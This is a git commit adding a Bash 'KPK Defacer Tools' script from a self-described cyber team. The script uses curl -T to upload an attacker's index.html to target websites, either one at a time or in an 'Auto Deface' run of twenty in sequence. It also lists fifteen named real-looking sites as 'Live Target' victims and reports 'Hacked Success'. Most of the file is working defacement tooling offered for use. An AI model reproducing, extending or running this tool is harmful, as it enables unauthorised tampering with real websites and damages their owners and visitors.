c2ca7ebccac7ef828f2ca77676da6d38c5569e49
alidamar <47432563+alidamar@users.noreply.github.com>
2019-04-11 10:45:00 +0000

    Add files via upload

---
+++ KPK.sh
@@ -0,0 +1,398 @@
+#Coding by Lee KPK
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+pkg install toilet -y
+bash jr.sh
+echo
+echo  $green
+echo "MARKAS SINGO KPK ##########################";
+sleep 0.1;
+clear
+echo  $green
+echo ' KPK & FAMS ###################################';
+sleep 0.1;
+clear
+echo  $green
+echo 'SUBANG CYBER TEAM ##########################';
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK #############################';
+sleep 0.4;
+echo  $green
+echo "MARKAS SINGO KPK #############################.";
+sleep 0.1;
+clear
+echo  $green
+echo  'MARKAS SINGO KPK ##############################.';
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK ###############################';
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK ...........................';
+sleep 0.1;
+echo  $green
+echo "MARKAS SINGO KPK .........................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK ....................................................';
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK ................................';
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK ............................................';
+sleep 0.1;
+echo  $green
+echo "MARKAS SINGO KPK .....................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK .............................';
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK ........................................................';
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK ........................';
+sleep 0.1;
+clear
+echo  $green
+echo "MARKAS SINGO KPK .............................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK ................';
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK .................................';
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK ...................................................';
+sleep 0.4;
+echo  $green
+echo "MARKAS SINGO KPK ....................................";
+sleep 0.1;
+clear
+echo  $green
+echo "MARKAS  SINGO KPK .............................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK ................';
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK .................................';
+sleep 0.1;
+clear
+echo  $green
+echo 'MARKAS SINGO KPK ...................................................';
+sleep 0.4;
+echo  $blue
+echo "Process Success ....................................";
+sleep 0.1;
+clear
+echo $green
+echo 
+echo 
+echo 
+echo 
+echo 
+toilet -f future "KPK Defacer Tools" | lolcat
+echo
+echo $blue"##############$green" WELCOME TO "$green##################"
+echo $blue
+figlet -f future "MARKAS SINGO KPK"
+echo
+echo $green"################$green" KPK TYPE "$green##################"
+echo
+echo $indigo"	~"$green"{"$white"A"$white"}"$green"."$blue"Tebas Index"$blue
+echo $indigo"        ~"$green"{"$white"B"$white"}"$green"."$blue"Web Scan"$blue
+echo $indigo"	~"$green"{"$white"C"$white"}"$green"."$blue"Auto Deface"$blue
+echo
+echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo $indigo"  +"$green"{"$white"T"$white"}"$blue"."$green"KPK LIVE TARGET"$indigo"      +"$green"{"$white"I"$white"}"$green"Info"$indigo"      +"$green"{"$white"Q"$white"}"$green"Quit"$blue
+echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo $indigo"=============================================================="
+echo
+echo $blue "╭─"$green"im Lee KPK"$blue" MARKAS SINGO KPK"$blue
+read -p " ╰─$ "  apaan
+echo
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future "Deface Tebas Index" | lolcat
+echo
+echo $green "Simpan SC Di Memory Internal Di Luar Folder "
+echo
+echo $green         "Live Target"
+echo $blue    "http://contsol.co.za"
+echo $blue   "http://colourfactory.co.za"
+echo $blue   "http://chillibitez.co.za"
+echo $blue   "http://chasingfantasia.com"
+echo $blue   "http://centraltech.co.za"
+echo $blue   "http://cblandscapes.co.za"
+echo $blue   "http://crimsonmonkeyweb.com"
+echo $blue   "http://kevinbutho.com"
+echo $white "http://prorepafrica.com"
+echo $white "http://xposurephotography.co.za"
+echo $white "http://windmillsandporcupines.co.za"
+echo $white "http://tcnig.co.za"
+echo $white "http://techdirect.co.za"
+echo $white "http://thehellenic.co.za"
+echo $white "http://valdicare.co.za"
+echo
+echo $blue "BANTAI TARGET !!!"
+echo $green "╭─"$green"im Lee "$blue" KPK "$blue
+read -p " ╰─$ "  target
+echo
+echo $blue "Masukan Script!!! "
+echo $green "╭─"$green"im Lee "$blue" ~/Nama SC Harus(index.html)"$blue
+read -p " ╰─$ "  script
+curl -T /storage/emulated/0/$script $target
+echo $blue "["$green"Hacked Success"$green"]"$blue"～～～＞"$green" $target"
+echo
+echo $green"["$blue"B"$blue"]"$blue"Back "$green"["$white"Q"$white"]"$white"Quit"
+read -p "[B/Q] : " Back
+fi
+
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+cd Files
+php KPK.php
+echo
+echo $green"["$blue"B"$blue"]"$blue"Back "$green"["$white"Q"$white"]"$blue"Quit"
+read -p "[B/Q] : " Back
+fi
+
+if [ $apaan = "C" ] || [ $apaan = "c" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo $green
+toilet -f future "Auto Deface 20" | lolcat
+echo $white "Deface Masal Sebanyak 20 Web"
+echo
+echo $green"###"$blue" ctrl + c to quit"$blue" ###"
+echo
+echo
+echo
+echo "Masukan Script !!!!"
+echo $blue "╭─"$green"im Lee"$blue" KPK "$blue                               
+read -p " ╰─$ " script
+echo
+echo
+echo $white"Masukan Target1 !!!!"
+echo $blue "╭─"$green"im Lee"$green" kpk "$green
+read -p " ╰─$ " target1
+curl -T /storage/emulated/0/$script $target1
+echo $blue"["$green"+"$green"]"$blue"==="$white"＞"$green"$target1/$script"
+echo
+echo $green"Masukan Target2 !!!!"
+echo $blue "╭─"$green"im Lee"$green" KPK "$green
+read -p " ╰─$ " target2
+curl -T /storage/emulated/0/$script $target2
+echo $green"["$blue"+"$blue"]"$green"==="$white"＞"$green"$target2/$script"
+echo
+echo $white"Masukan Target3 !!!!"
+echo $blue "╭─"$green"im Lee"$blue" KPK "$blue
+read -p " ╰─$ " target3
+curl -T /storage/emulated/0/$script $target3
+echo $blue"["$green"+"$green"]"$blue"==="$white"＞"$green"$target3/$script"
+echo
+echo $white"Masukan Target4 !!!!"
+echo $blue "╭─"$green"im Lee"$green" KPK "$green
+read -p " ╰─$ " target4
+curl -T /storage/emulated/0/$script $target4
+echo $blue"["$green"+"$green"]"$blue"==="$white"＞"$green"$target4/$script"
+echo
+echo $white"Masukan Target5 !!!!"
+echo $blue "╭─"$green"im Lee"$green" KPK "$blue
+read -p " ╰─$ " target5
+curl -T /storage/emulated/0/$script $target5
+echo $blue"["$green"+"$green"]"$blue"==="$white"＞"$green"$target5/$script"
+echo
+echo $white"Masukan Target6 !!!!"
+echo $blue "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target6
+curl -T /storage/emulated/0/$script $target6
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target6/$script"
+echo
+echo $white"Masukan Target7 !!!!"
+echo $white "╭─"$green"im Lee"$red" KPK "$white
+read -p " ╰─$ " target7
+curl -T /storage/emulated/0/$script $target7
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target7/$script"
+echo
+echo $white"Masukan Target8 !!!!"
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target8
+curl -T /storage/emulated/0/$script $target8
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target8/$script"
+echo
+echo $white"Masukan Target9 !!!!"
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target9
+curl -T /storage/emulated/0/$script $target9
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target9/$script"
+echo
+echo $white"Masukan Target10 !!!! "
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target10
+curl -T /storage/emulated/0/$script $target10
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target10/$script"
+echo
+echo $white"Masukan Target11 !!!! "
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target11
+curl -T /storage/emulated/0/$script $target11
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target11/$script"
+echo
+echo $white"Masukan Target12 !!!! "
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target12
+curl -T /storage/emulated/0/$script $target12
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target12/$script"
+echo
+echo $white"Masukan Target13 !!!! "
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target13
+curl -T /storage/emulated/0/$script $target13
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target13/$script"
+echo
+echo $white"Masukan Target14 !!!! "
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target14
+curl -T /storage/emulated/0/$script $target14
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target14/$script"
+echo
+echo $white"Masukan Target15 !!!! "
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target15
+curl -T /storage/emulated/0/$script $target15
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target15/$script"
+echo
+echo $white"Masukan Target16 !!!! "
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target16
+curl -T /storage/emulated/0/$script $target16
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target16/$script"
+echo
+echo $white"Masukan Target17 !!!! "
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target17
+curl -T /storage/emulated/0/$script $target17
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target17/$script"
+echo
+echo $white"Masukan Target18 !!!! "
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target18
+curl -T /storage/emulated/0/$script $target18
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target18/$script"
+echo
+echo $white"Masukan Target19 !!!! "
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target19
+curl -T /storage/emulated/0/$script $target19
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target19/$script"
+echo
+echo $white"Masukan Target20 !!!! "
+echo $white "╭─"$green"im Lee"$cyan" KPK "$white
+read -p " ╰─$ " target20
+curl -T /storage/emulated/0/$script $target20
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target20/$script"
+echo
+echo
+echo $green"["$blue"B"$blue"]"$white"back "$green"["$white"Q"$white"]"$blue"Quit"
+read -p "[B/Q] : " Back
+fi
+
+if [ $apaan = "I" ] || [ $apaan = "i" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future "   Informasi Tools" | lolcat
+echo $green"##########################$green" WELCOME "$red###########################"
+echo $white"Creator  : im Lee KPK			"
+echo $white"Github   : https://github.com/alekpk04"
+echo $white"FAMBES    : http://line.me/ti/p/%40fuk2381z"
+echo
+echo $blue"                          THANKS TO :"
+echo
+echo $green"[+] ALLAH S.W.T "
+echo $green"[+] MARKAS SINGO KPK "
+echo $green"[+] SUBANG CYBER TEAM "
+echo $blue"##########################$green" WELCOME "$green##################################"
+echo $indigo"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo $green"["$blue"B"$blue"]"$white"back "$green"["$white"Q"$white"]"$blue"Quit"
+read -p "[B/Q] " Back
+fi
+
+if [ $apaan = "T" ] || [ $apaan = "t" ]
+then
+cat tutorial.txt
+echo
+echo $green"["$blue"B"$blue"]"$white"back "$green"["$white"Q"$white"]"$blue"Quit"
+read -p "[B/Q] " Back
+fi
+
+if [ $apaan = "Q" ] || [ $apaan = "q" ]
+then
+echo " Terimakasih Sudah Menggunakan Tools Kami :) "
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+sh KPK.sh
+fi
+
+if [ $back = "Q" ] || [ $back = "q" ]
+then
+clear
+fi
